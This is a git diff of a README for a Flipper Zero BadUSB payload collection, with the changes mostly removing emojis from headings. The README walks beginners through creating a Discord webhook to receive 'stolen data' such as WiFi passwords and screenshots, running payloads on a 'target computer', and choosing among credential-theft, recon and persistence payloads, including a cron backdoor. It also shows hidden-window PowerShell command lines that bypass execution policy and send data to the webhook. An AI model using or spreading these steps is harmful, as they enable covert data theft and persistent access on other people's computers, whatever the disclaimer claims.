@@ -1,4 +1,4 @@
-# 🐬 Flipper Zero BadUSB - Modular Payload System
+# Flipper Zero BadUSB - Modular Payload System
 
 <div align="center">
 
@@ -17,7 +17,7 @@
 
 ---
 
-## ⚡ Why This System?
+## Why This System?
 
 | Feature | Traditional | This System |
 |---------|-------------|-------------|
@@ -30,11 +30,11 @@
 
 ---
 
-## 🚀 Quick Start (Complete Beginners)
+## Quick Start (Complete Beginners)
 
 **Never used Flipper BadUSB before?** Follow these 5 easy steps:
 
-### Step 1️⃣: Get a Discord Webhook
+### Step 1: Get a Discord Webhook
 
 **Why?** This is where your Flipper will send stolen data (WiFi passwords, screenshots, etc.)
 
@@ -42,9 +42,9 @@
 2. Right-click the server name → **Server Settings**
 3. Click **Integrations** → **Webhooks** → **New Webhook**
 4. Click **Copy Webhook URL**  
-   ✅ You'll get something like: `https://discord.com/api/webhooks/1234567890/AbCdEf...`
+ You'll get something like: `https://discord.com/api/webhooks/1234567890/AbCdEf...`
 
-### Step 2️⃣: Pick a Payload
+### Step 2: Pick a Payload
 
 **Start simple! Try these first:**
 
@@ -70,7 +70,7 @@ STRING powershell ... '$env:DC='YOUR_DISCORD_WEBHOOK';...
 STRING powershell ... '$env:DC='https://discord.com/api/webhooks/1234567890/AbCdEf...';...
 ```
 
-**That's it!** Save the file. ✅
+**That's it!** Save the file.
 
 ### Step 4️⃣: Copy to Flipper
 
@@ -86,13 +86,13 @@ Connect Flipper to your computer via USB:
 1. On Flipper: `Apps` → `Bad USB` → Select your payload
 2. Plug Flipper into target computer's USB port
 3. Press **OK button** on Flipper to run
-4. Check Discord for results! 🎉
+4. Check Discord for results!
 
 ---
 
-## 📦 Available Payloads
+## Available Payloads
 
-### 🪟 Windows
+### Windows
 
 | Category | Payloads |
 |----------|----------|
@@ -102,7 +102,7 @@ Connect Flipper to your computer via USB:
 | **Recon** | `full_recon` |
 | **Persistence** | `persist` |
 
-### 🐧 Linux
+### Linux
 
 | Category | Payloads |
 |----------|----------|
@@ -112,7 +112,7 @@ Connect Flipper to your computer via USB:
 | **Recon** | `full_recon` |
 | **Persistence** | `cron_backdoor` |
 
-### 🍎 macOS
+### macOS
 
 | Category | Payloads |
 |----------|----------|
@@ -121,7 +121,7 @@ Connect Flipper to your computer via USB:
 | **Fun** | `rickroll` `tts_message` |
 | **Recon** | `full_recon` |
 
-### 📱 iOS
+### iOS
 
 | Category | Payloads |
 |----------|----------|
@@ -132,7 +132,7 @@ Connect Flipper to your computer via USB:
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 ### Environment Variables
 
@@ -155,7 +155,7 @@ STRING powershell -w h -ep bypass "$env:DC='https://discord.com/api/webhooks/123
 
 ---
 
-## 📁 Repository Structure
+## Repository Structure
 
 ```
 FlipperZero_BadUSB/
@@ -239,7 +239,7 @@ https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/remote-payloads
 
 ---
 
-## ⚠️ Legal Disclaimer
+## Legal Disclaimer
 
 **THIS SOFTWARE IS FOR AUTHORIZED SECURITY TESTING ONLY**
 
@@ -255,7 +255,7 @@ See [DISCLAIMER.md](DISCLAIMER.md) for full terms.
 
 ---
 
-## 📜 License
+## License
 
 This project is licensed under **CC BY-NC-SA 4.0**
 
@@ -266,7 +266,7 @@ This project is licensed under **CC BY-NC-SA 4.0**
 
 ---
 
-## 🙏 Credits
+## Credits
 
 - **dil1thium** - Original author
 - **Flipper Zero Community** - Inspiration and testing
